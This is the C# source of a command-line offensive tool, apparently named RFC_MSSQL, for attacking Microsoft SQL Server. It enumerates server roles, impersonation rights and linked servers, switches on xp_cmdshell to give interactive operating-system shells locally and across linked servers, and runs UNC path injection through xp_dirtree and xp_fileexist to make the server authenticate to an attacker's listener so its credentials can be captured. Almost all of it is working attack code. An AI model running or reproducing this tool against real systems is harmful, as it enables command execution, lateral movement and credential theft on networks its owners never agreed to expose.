using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.DirectoryServices;
using System.Linq;

namespace RFC_MSSQL
{
    public class Program
    {
        static void HelpMenu()
        {
            Console.WriteLine("Usage: RFC_MSSQL.exe <command> --server <sql server>");
            Console.WriteLine("\nCommands:");
            Console.WriteLine("\tenum\t\t\tEnumerate SQL Server");
            Console.WriteLine("\tsql_shell\t\t\tSQL Shell");
            Console.WriteLine("\tos_shell\t\t\tOS Shell");
            Console.WriteLine("\txp_cmdshell_enable\t\tEnable xp_cmdshell");
            Console.WriteLine("\txp_cmdshell_disable\t\tDisable xp_cmdshell");
            Console.WriteLine("\tunc_path_injection\t\tUNC Path Injection");
            Console.WriteLine("\tsql_instance_domain\t\tQuery for all domain joined SQL Servers");
            Console.WriteLine("\tsql_linked_server_crawl\t\tCrawl linked servers");
            Console.WriteLine("\tsql_shell_linked_server\t\tSQL Shell on linked server");
            Console.WriteLine("\tsql_linked_server_enable_xp\t\tEnable xp_cmdshell on linked server");
            Console.WriteLine("\tsql_linked_server_disable_xp\t\tDisable xp_cmdshell on linked server");
            Console.WriteLine("\tos_shell_linked_server\t\tOS Shell on linked server");
            Console.WriteLine("\nOptions:");
            Console.WriteLine("\t-h, --help\t\tShow help menu");
            Console.WriteLine("\t-s, --server\t\tSpecify SQL Server");
            Console.WriteLine("\t-ls, --linkedserver\t\tSpecify SQL Linked Server");
            Console.WriteLine("\t-d, --database\t\tSpecify database. Default: master");
            Console.WriteLine("\t-c, --connectionstring\tSpecify connection string. Default: Server={Server};Database={Database};Integrated Security = True;");
            Console.WriteLine("\t-u, --username\t\tSpecify username");
            Console.WriteLine("\t-p, --password\t\tSpecify password");
            Console.WriteLine("\t-l, --listener\t\tSpecify UNC listener");
            Console.WriteLine("\nExamples:");
            Console.WriteLine("\tRFC_MSSQL.exe enum --server 192.168.45.5");
            Console.WriteLine("\tRFC_MSSQL.exe sql_shell --server localhost");
            Console.WriteLine("");
        }
        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                HelpMenu();
                return;
            }

            for (int i = 1; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-h":
                    case "--help":
                        HelpMenu();
                        break;
                    case "-s":
                    case "--server":
                        SQLConnection.Server = args[i + 1];
                        break;
                    case "-ls":
                    case "--linkedserver":
                        SQLConnection.LinkedServer = args[i + 1];
                        break;
                    case "-d":
                    case "--database":
                        SQLConnection.Database = args[i + 1];
                        break;
                    case "-c":
                    case "--connectionstring":
                        SQLConnection.ConnectionString = args[i + 1];
                        break;
                    case "-u":
                    case "--username":
                        SQLConnection.Username = args[i + 1];
                        break;
                    case "-p":
                    case "--password":
                        SQLConnection.Password = args[i + 1];
                        break;
                    case "-l":
                    case "--listener":
                        SQLConnection.UNCListener = args[i + 1];
                        break;

                }
            }

            SQLConnection connection = new SQLConnection();
            connection.StartConnection();

            string function = args[0];

            switch (function)
            {
                case "enum":
                    connection.Enum();
                    break;
                case "sql_shell":
                    connection.sql_shell();
                    break;
                case "os_shell":
                    connection.os_shell();
                    break;
                case "xp_cmdshell_enable":
                    connection.xp_cmdshell_enable();
                    break;
                case "xp_cmdshell_disable":
                    connection.xp_cmdshell_disable();
                    break;
                case "unc_path_injection":
                    if (SQLConnection.UNCListener == null)
                    {
                        Console.WriteLine("[!] Please specify a listener\n");
                        break;
                    }
                    else
                    {
                        connection.unc_path_injection();
                        break;
                    }
                case "sql_instance_domain":
                    connection.sql_instance_domain();
                    break;
                case "sql_linked_server_crawl":
                    connection.sql_linked_server_crawl();
                    break;
                case "sql_shell_linked_server":
                    if (SQLConnection.LinkedServer == null)
                    {
                        Console.WriteLine("[!] Please specify a linked server\n");
                        break;
                    }
                    else
                    {
                        connection.sql_shell_linked_server();
                        break;
                    }
                case "sql_linked_server_enable_xp":
                    if (SQLConnection.LinkedServer == null)
                    {
                        Console.WriteLine("[!] Please specify a linked server\n");
                        break;
                    }
                    else
                    {
                        connection.sql_linked_server_enable_xp();
                        break;
                    }
                case "sql_linked_server_disable_xp":
                    if (SQLConnection.LinkedServer == null)
                    {
                        Console.WriteLine("[!] Please specify a linked server\n");
                        break;
                    }
                    else
                    {
                        connection.sql_linked_server_disable_xp();
                        break;
                    }
                case "os_shell_linked_server":
                    if (SQLConnection.LinkedServer == null)
                    {
                        Console.WriteLine("[!] Please specify a linked server\n");
                        break;
                    }
                    else
                    {
                        connection.os_shell_linked_server();
                        break;
                    }
            }

            Console.WriteLine();
            connection.CloseConnection();
        }

        class SQLConnection
        {
            #region Config

            public static string Server { get; set; } = "localhost";
            public static string LinkedServer { get; set; }
            public static string Database { get; set; } = "master";
            public static string SQLUser { get; set; }
            public static string ConnectionString { get; set; } = $"Server={Server};Database={Database};";
            public static string Username { get; set; }
            public static string Password { get; set; }
            public static SqlConnection Instance { get; set; } = new SqlConnection();
            public static string SQLQuery { get; set; }
            public SqlCommand Command { get; set; }
            public static SqlDataReader DataReader { get; set; }
            public static string UNCListener { get; set; }

            #endregion
            public void StartConnection()
            {
                // if username is set make sure password is set
                if (Username != null && Password == null)
                {
                    Console.WriteLine("[!] Please specify username and password\n");
                    return;
                }
                else if (Username != null)
                { 
                    // if username is like *\* use windows authentication else use SQL authentication
                    if (Username.Contains(@"\"))
                    {
                        ConnectionString = $"Server={Server};Database={Database};uid={Username};pwd={Password};";
                    }
                    else
                    {
                        ConnectionString = $"Server={Server};Database={Database};User Id={Username};Password={Password};";
                    }
                }


                Console.WriteLine($"[*] {ConnectionString}");
                Instance = new SqlConnection(ConnectionString);

                // try to authenticate and open connection 
                try
                {
                    Instance.Open();
                    Console.WriteLine($"[+] Authentication was successful!");
                    SQLQuery = "SELECT SYSTEM_USER;";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Read();
                    SQLUser = DataReader[0].ToString();
                    Console.WriteLine($"[*] System login: {SQLUser}");
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Authentication failed!");
                    Console.WriteLine($"ERROR: {ex.Message}");
                    return;
                }
            }

            public void CloseConnection()
            {
                Instance.Close();
            }

            public void Enum()
            {
                #region Enumerating SQL Server
                Console.WriteLine("\nEnumerating SQL Server");

                SQLQuery = "SELECT @@VERSION;";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                string Version = DataReader[0].ToString();
                Console.WriteLine($"[*] SQL Server Version:\n\t{Version}");
                DataReader.Close();

                SQLQuery = "SELECT @@SERVERNAME;";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                string Hostname = DataReader[0].ToString();
                Console.WriteLine($"[*] SQL Server Hostname: {Hostname}");
                DataReader.Close();

                SQLQuery = "SELECT name FROM master.dbo.sysdatabases;";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                string Databases = DataReader[0].ToString();
                Console.WriteLine($"[*] Databases:\n\t{Databases}");
                DataReader.Close();

                #endregion

                #region Enumerating SQL Server Configuration

                Console.WriteLine("\nSQL Role Enumeration");
                SQLQuery = "SELECT is_srvrolemember('sysadmin');";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                int isSysadmin = Convert.ToInt32(DataReader[0]);
                if (isSysadmin == 1)
                {
                    Console.BackgroundColor = ConsoleColor.Red;
                    Console.WriteLine("[*] User is sysadmin");
                    Console.ResetColor();
                }
                else
                {
                    Console.WriteLine("[*] User is not sysadmin");
                }
                DataReader.Close();

                SQLQuery = $"select r.name as Role, m.name as Principal\r\n\r\nfrom\r\n\r\n    master.sys.server_role_members rm\r\n\r\n    inner join\r\n\r\n    master.sys.server_principals r on r.principal_id = rm.role_principal_id and r.type = 'R'\r\n\r\n    inner join\r\n\r\n    master.sys.server_principals m on m.principal_id = rm.member_principal_id\r\n\r\nwhere m.name = '{SQLUser}'";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                Console.WriteLine("[*] User is member of the following roles:");
                while (DataReader.Read())
                {
                    string Role = DataReader[0].ToString();
                    string Principal = DataReader[1].ToString();
                    Console.WriteLine($"\t{Role} - {Principal}");
                }
                DataReader.Close();

                SQLQuery = $"SELECT r.name role_principal_name, m.name AS member_principal_name\r\n\r\nFROM sys.database_role_members rm \r\n\r\nJOIN sys.database_principals r \r\n\r\n    ON rm.role_principal_id = r.principal_id\r\n\r\nJOIN sys.database_principals m \r\n\r\n    ON rm.member_principal_id = m.principal_id\r\n\r\nwhere m.name = '{SQLUser}'";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                Console.WriteLine("[*] User is member of the following database roles:");
                while (DataReader.Read())
                {
                    string Role = DataReader[0].ToString();
                    string Principal = DataReader[1].ToString();
                    Console.WriteLine($"\t{Role} - {Principal}");
                }
                DataReader.Close();

                Console.WriteLine("\nSQL Impersonation Enumeration");
                SQLQuery = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                Console.WriteLine($"[*] User can impersonate:");
                while (DataReader.Read())
                {
                    string Impersonation = DataReader[0].ToString();
                    Console.WriteLine($"\n\t{Impersonation}");
                }
                DataReader.Close();

                SQLQuery = "SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner,  is_trustworthy_on AS TRUSTWORTHY from sys.databases \r\nwhere is_trustworthy_on = 1;\r\n";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                Console.WriteLine("[*] Trustworthy databases:\n");
                DataReaderOutput();
                DataReader.Close();

                Console.WriteLine("\nSQL Linked Servers Enumeration");
                SQLQuery = "EXEC sp_linkedservers";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                Console.WriteLine("[*] Linked Servers:\n");
                DataReaderOutput();
                DataReader.Close();

                #endregion
            }

            public void sql_shell()
            {
                #region SQL Shell
                Console.WriteLine("\nExecuting SQL commands");
                Console.WriteLine("[*] Enter 'exit' to return to the main menu");
                while (true)
                {
                    Console.Write("sql> ");
                    string cmd = Console.ReadLine();
                    if (cmd == "exit")
                    {
                        break;
                    }
                    else
                    {
                        try
                        {
                            SQLQuery = cmd;
                            Command = new SqlCommand(SQLQuery, Instance);
                            DataReader = Command.ExecuteReader();
                            Console.WriteLine();
                            DataReaderOutput();
                            Console.WriteLine();
                            DataReader.Close();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                        }
                    }
                }
                #endregion
            }

            public void os_shell()
            {
                #region OS Shell
                Console.WriteLine("\nExecuting shell commands");
                Console.WriteLine("[*] Enter 'exit' to return to the main menu");
                while (true)
                {
                    Console.Write("cmd> ");
                    string cmd = Console.ReadLine();
                    if (cmd == "exit")
                    {
                        break;
                    }
                    else
                    {
                        try
                        {
                            SQLQuery = $"EXEC xp_cmdshell '{cmd}'";
                            Command = new SqlCommand(SQLQuery, Instance);
                            DataReader = Command.ExecuteReader();
                            while (DataReader.Read())
                            {
                                string output = DataReader[0].ToString();
                                Console.WriteLine(output);
                            }
                            DataReader.Close();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                            break;
                        }

                    }
                }
                #endregion
            }

            public void xp_cmdshell_enable()
            {
                #region Enable xp_cmdshell 
                try
                {
                    Console.WriteLine("\nEnabling xp_cmdshell");
                    SQLQuery = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Read();
                    Console.WriteLine("[*] xp_cmdshell enabled");
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                }
                #endregion
            }

            public void xp_cmdshell_disable()
            {
                #region Disable xp_cmdshell
                try
                {
                    Console.WriteLine("\nDisabling xp_cmdshell");
                    SQLQuery = "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Read();
                    Console.WriteLine("[*] xp_cmdshell disabled");
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                }
                #endregion
            }

            public void unc_path_injection()
            {
                #region UNC Path Injection
                Console.WriteLine("Executing UNC path injection");

                // xp_dirtree
                try
                {
                    Console.WriteLine("[*] Running EXEC master..xp_dirtree");
                    SQLQuery = $"EXEC master..xp_dirtree \"\\\\{UNCListener}\\\\rfc-uncpath\";";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Unable to execute xp_dirtree!\n[!] ERROR: {ex.Message}\n");
                }

                // xp_fileexist
                try
                {
                    Console.WriteLine("[*] Running EXEC master..xp_fileexist");
                    SQLQuery = $"EXEC master..xp_fileexist \"\\\\{UNCListener}\\\\rfc-uncpath\";";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Unable to execute xp_fileexist!\n[!] ERROR: {ex.Message}\n");
                }
                #endregion
            }

            public void sql_instance_domain()
            {
                string domain = "";
                try
                {
                    // Setting up directoryEntry
                    DirectoryEntry directoryRootDSEEntry = new DirectoryEntry("LDAP://RootDSE");

                    // Get the current domain we running in
                    domain = directoryRootDSEEntry.Properties["defaultNamingContext"].Value.ToString();
                    Console.WriteLine($"[i] Current domain: {domain}\n");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\n[!] You have to be running from a AD joined machine");
                    Console.WriteLine($"[!] ERROR: {ex.Message}.\n");
                }

                SearchResultCollection results;
                string spnFilter = "(&(objectCategory=User)(servicePrincipalName=MSSQLSvc/*))";
                DirectoryEntry directoryEntry = new DirectoryEntry($"LDAP://{domain}");
                DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry);
                directorySearcher.PropertiesToLoad.Add("ServicePrincipalName");
                directorySearcher.PropertiesToLoad.Add("Name");
                directorySearcher.PropertiesToLoad.Add("SamAccountName");
                directorySearcher.PropertiesToLoad.Add("memberof");
                directorySearcher.PropertiesToLoad.Add("pwdlastset");

                directorySearcher.Filter = spnFilter;
                results = directorySearcher.FindAll();

                foreach (SearchResult result in results)
                {
                    foreach (var spn in result.Properties["ServicePrincipalName"])
                    {
                        Console.WriteLine($"\n[+] Found MSSQL spn: {spn}");
                        Console.WriteLine($"\t|");
                        Console.WriteLine($"\t> Name: {result.Properties["Name"][0].ToString()}");
                        Console.WriteLine($"\t> SamAccountName: {result.Properties["SamAccountName"][0].ToString()}");
                        Console.WriteLine($"\t> memberof: {result.Properties["memberof"][0].ToString()}");
                        Console.WriteLine($"\t> pwdlastset: {DateTime.FromFileTime((long)result.Properties["pwdlastset"][0])}");
                    }
                }
            }

            public void sql_linked_server_crawl()
            {
                #region Linked Server Crawl
                List<string> LinkedServers = new List<string>();
                Console.WriteLine("\nCrawling linked servers");
                SQLQuery = "SELECT name FROM sys.servers WHERE is_linked = 1;";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                while (DataReader.Read())
                {
                    LinkedServers.Add(DataReader.GetString(0));
                    Console.WriteLine($"[+] Found linked server: {DataReader[0].ToString()}");
                }
                DataReader.Close();

                Console.WriteLine("\nLinked Server Enumeration");
                foreach (string s in LinkedServers)
                {
                    Console.WriteLine($"\n[+] Linked Server: {s}");
                    SQLQuery = $"SELECT myuser from openquery(\"{s}\", 'select SYSTEM_USER as myuser');";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Read();
                    Console.WriteLine($"[+] Linked Server user: {DataReader[0].ToString()} on {s}");
                    DataReader.Close();
                    SQLQuery = $"SELECT SYSTEM_USER;";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Read();
                    Console.WriteLine($"[+] Current user: {DataReader[0].ToString()} on {Server}");
                    DataReader.Close();
                }
                #endregion
            }

            public void sql_shell_linked_server()
            {
                #region SQL Shell Linked Server
                Console.WriteLine($"\nExecuting SQL commands on {LinkedServer}");
                SQLQuery = $"SELECT myuser from openquery(\"{LinkedServer}\", 'select SYSTEM_USER as myuser');";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                Console.WriteLine($"[+] Linked Server user: {DataReader[0].ToString()} on {LinkedServer}");
                DataReader.Close();
                Console.WriteLine("[*] Enter 'exit' to return to the main menu");
                while (true)
                {
                    Console.Write("sql> ");
                    string cmd = Console.ReadLine();
                    if (cmd == "exit")
                    {
                        break;
                    } 
                    else
                    {
                        try
                        {
                            cmd = cmd.Replace("'", "''");
                            SQLQuery = $"select * from openquery(\"{LinkedServer}\", '{cmd}')";
                            Command = new SqlCommand(SQLQuery, Instance);
                            DataReader = Command.ExecuteReader();
                            Console.WriteLine();
                            DataReaderOutput();
                            Console.WriteLine();
                            DataReader.Close();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                        }
                    }
                }
                #endregion
            }

            public void sql_linked_server_enable_xp()
            {
                #region SQL Linked Server Enabling xp_cmdshell
                Console.WriteLine($"\nExecuting SQL commands on {LinkedServer}");
                SQLQuery = $"SELECT myuser from openquery(\"{LinkedServer}\", 'select SYSTEM_USER as myuser');";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                Console.WriteLine($"[+] Linked Server user: {DataReader[0].ToString()} on {LinkedServer}");
                DataReader.Close();

                try
                {
                    Console.WriteLine($"[*] Trying to enable xp_cmdshell on linked server {LinkedServer}");
                    SQLQuery = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {LinkedServer}";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                    SQLQuery = $"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT {LinkedServer}";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                }

                Console.WriteLine("[*] Print xp_cmdshell status");
                SQLQuery = $"EXEC ('sp_configure ''xp_cmdshell''') AT {LinkedServer}";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReaderOutput();
                DataReader.Close();
                #endregion
            }

            public void sql_linked_server_disable_xp()
            {
                #region SQL Linked Server Enabling xp_cmdshell
                Console.WriteLine($"\nExecuting SQL commands on {LinkedServer}");
                SQLQuery = $"SELECT myuser from openquery(\"{LinkedServer}\", 'select SYSTEM_USER as myuser');";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                Console.WriteLine($"[+] Linked Server user: {DataReader[0].ToString()} on {LinkedServer}");
                DataReader.Close();

                try
                {
                    Console.WriteLine($"[*] Trying to disable xp_cmdshell on linked server {LinkedServer}");
                    SQLQuery = $"EXEC ('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT {LinkedServer}";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                    SQLQuery = $"EXEC ('sp_configure ''show advanced options'', 0; reconfigure;') AT {LinkedServer}";
                    Command = new SqlCommand(SQLQuery, Instance);
                    DataReader = Command.ExecuteReader();
                    DataReader.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                }
                #endregion
            }

            public void os_shell_linked_server()
            {
                #region Linked Server OS Shell
                Console.WriteLine($"\nExecuting shell commands on {LinkedServer}");
                SQLQuery = $"SELECT myuser from openquery(\"{LinkedServer}\", 'select SYSTEM_USER as myuser');";
                Command = new SqlCommand(SQLQuery, Instance);
                DataReader = Command.ExecuteReader();
                DataReader.Read();
                Console.WriteLine($"[+] Linked Server user: {DataReader[0].ToString()} on {LinkedServer}");
                DataReader.Close();
                Console.WriteLine("[*] Enter 'exit' to return to the main menu");
                while (true)
                {
                    Console.Write("cmd> ");
                    string cmd = Console.ReadLine();
                    if (cmd == "exit")
                    {
                        break;
                    }
                    else
                    {
                        try
                        {
                            SQLQuery = $"EXEC ('EXEC xp_cmdshell ''{cmd}''') AT {LinkedServer}";
                            Command = new SqlCommand(SQLQuery, Instance);
                            DataReader = Command.ExecuteReader();
                            while (DataReader.Read())
                            {
                                string output = DataReader[0].ToString();
                                Console.WriteLine(output);
                            }
                            DataReader.Close();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] ERROR: {ex.ToString()}");
                            break;
                        }

                    }
                }
                #endregion
            }

            public void DataReaderOutput()
            {
                if (DataReader.HasRows && DataReader.FieldCount == 1)
                {
                    while (DataReader.Read())
                    {
                        Console.WriteLine(DataReader[0].ToString());
                    }
                }
                else if (DataReader.HasRows && DataReader.FieldCount > 1)
                {
                    // Get the column names and widths
                    string[] columnNames = new string[DataReader.FieldCount];
                    int[] columnWidths = new int[DataReader.FieldCount];
                    for (int i = 0; i < DataReader.FieldCount; i++)
                    {
                        string columnName = DataReader.GetName(i);
                        columnNames[i] = columnName;
                        columnWidths[i] = Math.Max(columnName.Length, 3);
                    }

                    // Read the data rows
                    string[][] rows = new string[0][];
                    while (DataReader.Read())
                    {
                        string[] row = new string[DataReader.FieldCount];
                        for (int i = 0; i < DataReader.FieldCount; i++)
                        {
                            row[i] = DataReader[i].ToString();
                            columnWidths[i] = Math.Max(columnWidths[i], row[i].Length);
                        }
                        rows = rows.Append(row).ToArray();
                    }

                    // Output the table header
                    Console.WriteLine("| " + string.Join(" | ", columnNames.Select((name, i) => name.PadRight(columnWidths[i]))) + " |");

                    // Output the table header separator
                    Console.WriteLine("| " + string.Join(" | ", columnWidths.Select(width => new string('-', width))) + " |");

                    // Output the query results as rows and columns
                    foreach (string[] row in rows)
                    {
                        Console.WriteLine("| " + string.Join(" | ", row.Select((value, i) => value.PadRight(columnWidths[i]))) + " |");
                    }
                }
                else
                {
                    Console.WriteLine("[*] Query results empty!");
                }
            }
        }
    }
}
